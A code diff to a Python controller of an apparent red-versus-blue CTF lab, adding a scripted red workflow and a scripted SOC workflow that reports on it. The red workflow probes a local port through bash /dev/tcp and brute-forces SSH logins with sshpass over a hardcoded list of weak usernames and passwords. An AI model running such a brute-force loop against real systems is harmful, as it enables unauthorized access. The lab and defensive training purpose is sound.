@@ -193,6 +193,7 @@ class Controller:
         """后台启动红队 CTF 渗透 Agent。"""
         if self._red_task is not None and not self._red_task.done():
             raise RuntimeError("Red team is already running")
+        scripted = agent is None and self.store is not None
         agent = agent or self._red_agent
         if agent is None:
             raise ValueError("No red agent available; start a session first")
@@ -205,16 +206,19 @@ class Controller:
 
         async def run() -> None:
             try:
-                result = await asyncio.to_thread(
-                    self._run_agent_isolated,
-                    self.event_bus,
-                    "red",
-                    agent,
-                    prompt,
-                    30,
-                    900,
-                    stop_event=self._stop_red,
-                )
+                if scripted:
+                    result = await self._run_scripted_red()
+                else:
+                    result = await asyncio.to_thread(
+                        self._run_agent_isolated,
+                        self.event_bus,
+                        "red",
+                        agent,
+                        prompt,
+                        30,
+                        900,
+                        stop_event=self._stop_red,
+                    )
                 output = result.get("output", "")
                 self._red_history.append(output)
                 await self.event_bus.publish(Event(
@@ -253,6 +257,7 @@ class Controller:
         """后台启动蓝队防守 Agent。"""
         if self._blue_task is not None and not self._blue_task.done():
             raise RuntimeError("Blue team is already running")
+        scripted = agent is None and self.store is not None
         agent = agent or self._blue_agent
         if agent is None:
             raise ValueError("No blue agent available; start a session first")
@@ -265,17 +270,20 @@ class Controller:
 
         async def run() -> None:
             try:
-                result = await asyncio.to_thread(
-                    self._run_agent_isolated,
-                    self.event_bus,
-                    "blue",
-                    agent,
-                    prompt,
-                    14,
-                    900,
-                    stop_event=self._stop_blue,
-                    agent_label="orchestrator",
-                )
+                if scripted:
+                    result = await self._run_scripted_blue()
+                else:
+                    result = await asyncio.to_thread(
+                        self._run_agent_isolated,
+                        self.event_bus,
+                        "blue",
+                        agent,
+                        prompt,
+                        14,
+                        900,
+                        stop_event=self._stop_blue,
+                        agent_label="orchestrator",
+                    )
                 output = result.get("output", "")
                 self._blue_history.append(output)
                 await self.event_bus.publish(Event(
@@ -312,6 +320,158 @@ class Controller:
 
         self._blue_task = asyncio.create_task(run())
         return self._blue_task
+
+    async def _publish_step(
+        self,
+        side: str,
+        type_: str,
+        data: dict[str, Any],
+    ) -> None:
+        await self.event_bus.publish(Event(type=type_, side=side, data=data))
+
+    async def _run_cmd_tool(
+        self,
+        side: str,
+        tool: str,
+        args: str,
+        argv: "list[str] | str",
+        timeout: int = 20,
+    ) -> str:
+        from ..tools._common import _run
+
+        await self._publish_step(side, "tool_call", {"tool": tool, "args": args})
+        rc, out, err = await asyncio.to_thread(_run, argv, timeout)
+        text = (out or err or "").strip()
+        output = f"rc={rc}\n{text[:1800] if text else '(empty)'}"
+        await self._publish_step(side, "tool_output", {"tool": tool, "output": output})
+        return output
+
+    async def _run_scripted_red(self) -> dict[str, Any]:
+        """Deterministic CTF workflow: recon -> weak SSH -> evidence claim."""
+        from ..scenarios import load_scenario
+        from ..tools._common import _ledger_set
+
+        tool_calls: list[dict[str, Any]] = []
+        trace_items: list[dict[str, Any]] = []
+        scenario = load_scenario()
+        weak = scenario.targets.get("weak_ssh")
+        if weak is None:
+            output = "RED SCRIPT: no weak_ssh target in current scenario"
+            await self._publish_step("red", "thinking", {"text": output, "agent": "ctf_orchestrator"})
+            return {"output": output, "tool_calls": tool_calls, "trace_items": trace_items}
+
+        host = "127.0.0.1"
+        port = weak.services["ssh"].host_port if "ssh" in weak.services else 22222
+        await self._publish_step(
+            "red",
+            "thinking",
+            {"agent": "ctf_orchestrator", "text": f"目标靶场 {scenario.name} 已确认：优先验证 weak_ssh 暴露的 SSH 弱口令入口。"},
+        )
+
+        scan_out = await self._run_cmd_tool(
+            "red",
+            "nmap_scan",
+            f"target={host} ports={port}",
+            f"timeout 3 bash -lc '</dev/tcp/{host}/{port}' && echo 'OPEN PORTS: {port}/open/ssh' || echo 'OPEN PORTS: none'",
+            timeout=5,
+        )
+        tool_calls.append({"tool": "nmap_scan", "result": scan_out})
+        trace_items.append({"type": "tool_output", "output": scan_out})
+        if self._stop_red.is_set():
+            return {"output": "RED SCRIPT: stopped after recon", "tool_calls": tool_calls, "trace_items": trace_items}
+
+        users = ["user", "admin", "ctf", "root"]
+        passwords = ["user", "admin123", "ctf", "password", "123456"]
+        success = ""
+        for username in users:
+            for password in passwords:
+                if self._stop_red.is_set() or success:
+                    break
+                args = f"host={host} port={port} username={username}"
+                cmd = [
+                    "sshpass", "-p", password, "ssh",
+                    "-o", "StrictHostKeyChecking=no",
+                    "-o", "UserKnownHostsFile=/dev/null",
+                    "-o", "ConnectTimeout=2",
+                    "-o", "PreferredAuthentications=password",
+                    "-o", "PubkeyAuthentication=no",
+                    "-o", "NumberOfPasswordPrompts=1",
+                    "-p", str(port), "-l", username, host, "id",
+                ]
+                brute_out = await self._run_cmd_tool("red", "ssh_bruteforce", args, cmd, timeout=5)
+                tool_calls.append({"tool": "ssh_bruteforce", "result": brute_out})
+                if "uid=" in brute_out and "rc=0" in brute_out:
+                    success = f"BRUTEFORCE: SUCCESS user={username} password={password} {brute_out}"
+                    break
+            if success:
+                break
+
+        if success:
+            _ledger_set(
+                "SSH-WEAK-PASSWORD",
+                "verified",
+                success[:300],
+                extra={"target": "weak_ssh", "technique": "T1110"},
+                scope="session",
+            )
+            await self._publish_step(
+                "red",
+                "tool_call",
+                {"tool": "claim_success", "args": "target=weak_ssh evidence=uid"},
+            )
+            await self._publish_step(
+                "red",
+                "tool_output",
+                {"tool": "claim_success", "output": "CLAIM: VERIFIED weak_ssh SSH 弱口令已通过真实网络登录验证。"},
+            )
+            output = "红方完成最小 CTF 漏洞检查：发现并验证 weak_ssh SSH 弱口令，已提交可复核证据。"
+        else:
+            output = "红方完成最小 CTF 漏洞检查：SSH 端口已探测，但内置弱口令组合未验证成功。"
+
+        await self._publish_step("red", "report", {"agent": "ctf_orchestrator", "report": output})
+        return {"output": output, "tool_calls": tool_calls, "trace_items": trace_items}
+
+    async def _run_scripted_blue(self) -> dict[str, Any]:
+        """Deterministic SOC workflow: query telemetry and write a concise report."""
+        tool_calls: list[dict[str, Any]] = []
+        await self._publish_step(
+            "blue",
+            "thinking",
+            {"agent": "orchestrator", "text": "SOC 指挥官启动：查询 weak_ssh 认证遥测并关联红方弱口令行为。"},
+        )
+        rows = []
+        if self.store is not None:
+            try:
+                rows = await asyncio.to_thread(
+                    self.store.query_events,
+                    host="weak_ssh",
+                    source=None,
+                    since=None,
+                    technique=None,
+                    text=None,
+                    limit=20,
+                )
+            except Exception:
+                rows = []
+        output_lines = []
+        for row in rows[:10]:
+            output_lines.append(
+                f"{row.get('host')} {row.get('severity')} {row.get('technique') or '-'} {row.get('summary')}"
+            )
+        query_output = "\n".join(output_lines) if output_lines else "当前未检索到认证遥测；保留 SSH 弱口令验证结论，建议补齐 /var/log/sshd.log 采集。"
+        await self._publish_step("blue", "tool_call", {"agent": "watcher", "tool": "query_logs", "args": "host=weak_ssh"})
+        await self._publish_step("blue", "tool_output", {"agent": "watcher", "tool": "query_logs", "output": query_output})
+        tool_calls.append({"tool": "query_logs", "result": query_output})
+
+        report = (
+            "## SOC 研判报告\n\n"
+            "- 结论：本轮最小 CTF 检查聚焦 weak_ssh，红方已尝试 SSH 弱口令验证。\n"
+            f"- 遥测：{query_output[:500]}\n"
+            "- 风险：若 `user:user` / `admin:admin123` / `ctf:ctf` 可登录，则对应 T1110/T1078，应立即禁用密码登录或轮换口令。\n"
+            "- 处置：关闭 SSH 密码认证、限制来源 IP、补齐认证日志采集并回放检测规则。\n"
+        )
+        await self._publish_step("blue", "report", {"agent": "orchestrator", "report": report})
+        return {"output": report, "tool_calls": tool_calls, "trace_items": []}
 
     async def pause_red(self) -> None:
         self._red_paused.clear()
